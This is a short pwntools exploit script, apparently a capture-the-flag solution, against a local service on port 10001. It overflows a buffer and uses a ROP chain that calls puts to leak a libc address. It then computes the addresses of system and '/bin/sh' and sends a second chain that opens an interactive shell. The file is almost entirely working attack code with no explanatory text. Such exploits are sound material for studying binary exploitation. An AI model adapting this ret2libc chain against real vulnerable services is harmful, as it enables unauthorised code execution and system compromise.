from pwn import *


p=remote("localhost",10001)


#manually

'''

'''
puts_plt=0x0000000000401040
puts_got=0x404008
rdi=0x401316  # get from 'ropper -f main'

ret=0x0000000000401410
vuln=0x00000000004013c8
p.recvuntil("You're on your OWN\n")
p.recvline()
p.sendline(b"a"*0x10+p64(0x0000000000404800)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)) # one_gadgets dont always work
leak=p.recvline()[:-1]
puts_address=u64(leak.ljust(8,b"\x00"))

puts_offset=0x77640  # take this from 'gdb libc.so.6' (simplest way)
libc_base=puts_address-puts_offset
system=0x000000000004dab0 # get from the one_gadget tool 
system=libc_base+0x000000000004dab0
binsh=libc_base+0x197e34

#automated
#puts_offset=libc.symbols["puts"] 
#libc.address=puts_address-puts_offset
#system=libc.symbols["system"]
#binsh=next(libc.search(b"/bin/sh"))

p.sendline(b"a"*0x10+p64(0x0000000000404800)+p64(rdi)+p64(binsh)+p64(ret)+p64(system))



p.interactive()